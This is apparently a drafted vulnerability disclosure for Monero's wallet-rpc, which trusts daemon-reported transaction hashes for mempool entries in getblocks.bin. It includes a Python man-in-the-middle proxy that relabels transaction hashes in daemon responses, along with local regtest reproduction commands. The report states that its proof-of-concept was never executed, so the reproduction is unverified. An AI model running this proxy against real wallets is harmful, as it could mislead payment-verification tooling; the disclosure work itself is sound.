# Wallet-rpc trusts the daemon's self-reported `tx_hash` label for mempool transactions returned by `getblocks.bin`, without recomputing it from the transaction bytes

## Summary

When a Monero wallet refreshes against its daemon, `getblocks.bin` can return newly-seen mempool transactions inline as `pool_tx_info { tx_hash, tx_blob, double_spend_seen }` entries (the `added_pool_txs` field). `wallet2::process_pool_info_extent` validates the *shape* of `tx_blob` (parses and structurally validates it as a transaction) but pairs it with the daemon's own, self-reported `tx_hash` field verbatim — it never recomputes `tx_hash` from `tx_blob` to confirm the label actually matches the bytes. That `(transaction, tx_hash)` pair then flows straight into the wallet's pending-payment bookkeeping under the daemon-chosen hash, with nothing downstream re-deriving it either.

The same file's older, pre-existing pool-refresh path, `read_pool_txs`, does not have this gap: it recomputes the hash from the blob and cross-checks it. `process_pool_info_extent`, added later for a newer `getblocks.bin` extension, bypasses that check for this one inline array.

## Severity

Monero severity: **MEDIUM** ("impacts individual wallets, must be carefully exploited").
Suggested CVSS v3.1: `4.3` with `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N`.

Rationale mirrors the companion `scan_tx` finding submitted alongside this one: requires an actively malicious, compromised, or on-path daemon (a realistic but non-trivial precondition given Monero's supported "connect to a third-party remote node" use case), no fund loss (real received amounts are still independently verified via view-key derivation against the actual transaction bytes), but a genuine mislabeling of *which* txid the wallet believes it is tracking, on every ordinary wallet refresh — not something the operator has to explicitly opt into the way `scan_tx` is.

## Affected Versions

Confirmed present by direct source review on:
- `v0.18.5.1` (latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`)
- current `master`

## Root Cause

`src/rpc/core_rpc_server_commands_defs.h`:
```cpp
struct pool_tx_info
{
  crypto::hash tx_hash;
  blobdata tx_blob;
  bool double_spend_seen;

  BEGIN_KV_SERIALIZE_MAP()
    KV_SERIALIZE_VAL_POD_AS_BLOB(tx_hash)
    KV_SERIALIZE(tx_blob)
    KV_SERIALIZE(double_spend_seen)
  END_KV_SERIALIZE_MAP()
};
```
`tx_hash` and `tx_blob` are two independent, daemon-controlled fields sent together over the wire — nothing in the wire format itself ties them together.

`wallet2::process_pool_info_extent`, `src/wallet/wallet2.cpp`:
```cpp
void wallet2::process_pool_info_extent(const cryptonote::COMMAND_RPC_GET_BLOCKS_FAST::response &res, std::vector<std::tuple<cryptonote::transaction, crypto::hash, bool>> &process_txs, bool refreshed)
{
  std::vector<std::tuple<cryptonote::transaction, crypto::hash, bool>> added_pool_txs;
  added_pool_txs.reserve(res.added_pool_txs.size() + res.remaining_added_pool_txids.size());

  for (const auto &pool_tx: res.added_pool_txs)
  {
    cryptonote::transaction tx;
    THROW_WALLET_EXCEPTION_IF(!cryptonote::parse_and_validate_tx_base_from_blob(pool_tx.tx_blob, tx, true),
        error::wallet_internal_error, "Failed to validate transaction base from daemon");
    added_pool_txs.push_back(std::make_tuple(tx, pool_tx.tx_hash, pool_tx.double_spend_seen));
  }
  ...
}
```
`parse_and_validate_tx_base_from_blob` only parses and structurally validates the transaction; it does not compute or return a hash for comparison. `pool_tx.tx_hash` is used completely as-is. This tuple is handed to `update_pool_state_from_pool_data` and then `process_pool_state`, which also trusts the hash it's given rather than recomputing it:
```cpp
void wallet2::process_pool_state(const std::vector<std::tuple<cryptonote::transaction, crypto::hash, bool>> &txs)
{
  for (const auto &e: txs)
  {
    const cryptonote::transaction &tx = std::get<0>(e);
    const crypto::hash &tx_hash = std::get<1>(e);
    ...
    process_new_transaction(tx_hash, tx, ...);
  }
}
```

The correctly-implemented sibling in the same file, used for the pool-info overflow case (when there are more newly-added pool transactions than fit inline) and for the older pool-refresh path:
```cpp
void read_pool_txs(..., const std::vector<crypto::hash> &txids, std::vector<std::tuple<cryptonote::transaction, crypto::hash, bool>> &txs)
{
  ...
  const std::unordered_set<crypto::hash> txid_set(txids.begin(), txids.end());
  for (const auto &tx_entry: res.txs)
  {
    if (tx_entry.in_pool)
    {
      cryptonote::transaction tx;
      crypto::hash tx_hash;
      if (get_pruned_tx(tx_entry, tx, tx_hash))
      {
        if (txid_set.count(tx_hash) > 0)
          txs.push_back(std::make_tuple(tx, tx_hash, tx_entry.double_spend_seen));
        else
          MERROR("Got txid " << tx_hash << " which we did not ask for");
      }
    }
  }
}
```
`read_pool_txs` recomputes `tx_hash` from the blob via `get_pruned_tx` and only trusts it once it's a member of the requested id set. `process_pool_info_extent`'s inline `added_pool_txs` loop has no equivalent of either step: it neither recomputes the hash nor validates it against anything.

## Steps to Reproduce

Local `--regtest` setup, no public infrastructure. A small raw-byte HTTP proxy sits between the wallet and the daemon and rewrites one field of a real `getblocks.bin` response; it does not need to parse JSON or understand the whole binary schema, because the field being tampered with is a fixed-format, easy-to-locate byte pattern (see below).

### 1. Build the release binaries

```
git clone --branch v0.18.5.1 --depth 1 https://github.com/monero-project/monero.git
cd monero && git submodule update --init --recursive
mkdir -p build/release && cd build/release
cmake -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=OFF ../..
make -j"$(nproc)" daemon wallet-rpc
```

### 2. Start the regtest daemon and produce two distinct real, unconfirmed transactions

```
./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc-pool/chain \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 38081 --confirm-external-bind \
  --non-interactive &

mkdir -p /tmp/monero-poc-pool/wallets
./bin/monero-wallet-rpc --daemon-address 127.0.0.1:38081 \
  --wallet-dir /tmp/monero-poc-pool/wallets --rpc-bind-port 38091 --disable-rpc-login \
  --non-interactive &

curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"create_wallet","params":{"filename":"w","password":"","language":"English"}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"getaddress","params":{}}' -H 'Content-Type: application/json'
# note ADDR

curl -s http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"generateblocks","params":{"amount_of_blocks":20,"wallet_address":"ADDR"}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"refresh","params":{}}' -H 'Content-Type: application/json'

# Two distinct real, unconfirmed (left in the mempool) transactions
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"transfer","params":{"destinations":[{"amount":1000000000000,"address":"ADDR"}],"account_index":0,"priority":1}}' -H 'Content-Type: application/json'
# note tx_hash as TXID_REAL
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"transfer","params":{"destinations":[{"amount":2000000000000,"address":"ADDR"}],"account_index":0,"priority":1}}' -H 'Content-Type: application/json'
# note tx_hash as TXID_FAKE
```
(Leave both unconfirmed — do not mine another block yet — so they surface via the pool-info path.)

### 3. Stand up the raw-byte substitution proxy in front of `/getblocks.bin`

`crypto::hash` fields tagged `KV_SERIALIZE_VAL_POD_AS_BLOB` are written to the binary wire format as a plain length-prefixed byte string: a one-byte length marker `0x80` (encoding the value `32` in the format's single-byte varint scheme) immediately followed by the 32 raw hash bytes. That makes the field trivial to locate and replace directly in the raw response bytes, without implementing a full binary-format parser:

```python
#!/usr/bin/env python3
# poc_proxy_pool_hash_substitution.py
import http.server
import urllib.request
import binascii
import sys

REAL_DAEMON = "http://127.0.0.1:38081"
TXID_REAL = binascii.unhexlify(sys.argv[1])   # 32 raw bytes of the real, requested-context txid
TXID_FAKE = binascii.unhexlify(sys.argv[2])   # 32 raw bytes of the substitute label
LISTEN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 47080

NEEDLE = b"\x80" + TXID_REAL
REPLACEMENT = b"\x80" + TXID_FAKE

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)

        r = urllib.request.Request(REAL_DAEMON + self.path, data=body,
                                    headers={"Content-Type": "application/octet-stream"})
        resp_body = urllib.request.urlopen(r).read()

        if self.path == "/getblocks.bin" and NEEDLE in resp_body:
            occurrences = resp_body.count(NEEDLE)
            resp_body = resp_body.replace(NEEDLE, REPLACEMENT)
            print(f"[proxy] relabeled {occurrences} occurrence(s) of {sys.argv[1]} as {sys.argv[2]} in /getblocks.bin response")

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(resp_body)

    def log_message(self, *a):
        pass

http.server.HTTPServer(("127.0.0.1", LISTEN_PORT), Handler).serve_forever()
```

```
python3 poc_proxy_pool_hash_substitution.py TXID_REAL TXID_FAKE 47080 &
```

### 4. Point the wallet at the malicious proxy and refresh

```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"set_daemon","params":{"address":"127.0.0.1:47080","trusted":true}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"refresh","params":{}}' -H 'Content-Type: application/json'
```

### 5. Expected result on the vulnerable build

- The proxy log shows a relabel occurred.
- `get_transfers` / `get_bulk_payments` on the wallet subsequently shows the incoming/pending transfer that actually corresponds to `TXID_REAL`'s bytes tracked under the label `TXID_FAKE`:
```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"get_transfers","params":{"pending":true,"pool":true}}' -H 'Content-Type: application/json'
```
- Restoring `set_daemon` to point at the real daemon and mining a confirmation block should cause the wallet's block-scanning path (which does correctly recompute hashes) to self-correct the label once the transaction confirms — the mislabeling is transient, present only while the transaction is unconfirmed, but attacker-controlled during that whole window on every refresh.

## Possible Solution

In `process_pool_info_extent`, recompute the transaction hash from `pool_tx.tx_blob` (e.g. via `cryptonote::get_transaction_hash(tx)` after `parse_and_validate_tx_base_from_blob` succeeds) and use that recomputed value instead of trusting `pool_tx.tx_hash` from the wire, exactly mirroring the discipline `read_pool_txs` already applies a few hundred lines away in the same file.

## Impact

A malicious, compromised, or on-path (MITM, cleartext HTTP) daemon can cause a wallet's ordinary refresh cycle to mislabel a real, correctly-verified incoming or outgoing pending transaction under a different, attacker-chosen txid, for as long as that transaction remains unconfirmed. This can confuse any automation or payment-verification tooling that watches wallet-rpc for "unconfirmed payment under txid X" (a merchant integration, for instance) without creating any counterfeit value — amounts and ownership are still independently verified via the wallet's normal view-key-derivation checks against the real transaction bytes.

## Note on AI usage

Source-code analysis (locating the missing hash recomputation and confirming the exact binary wire encoding of `KV_SERIALIZE_VAL_POD_AS_BLOB` fields used to build the substitution proxy) and drafting of this report were done with AI assistance, working directly against the `v0.18.5.1` release source. **This has been verified by static code reading and manual derivation of the binary wire format only — the reproduction steps and proxy script have not yet been executed against a running daemon/wallet-rpc pair.** Please run them, capture the actual wallet-rpc responses and proxy log output (and, if convenient, a hex dump confirming the byte pattern assumption above holds for your build), and attach that transcript before submitting, per this program's requirement for a working PoC with logs.
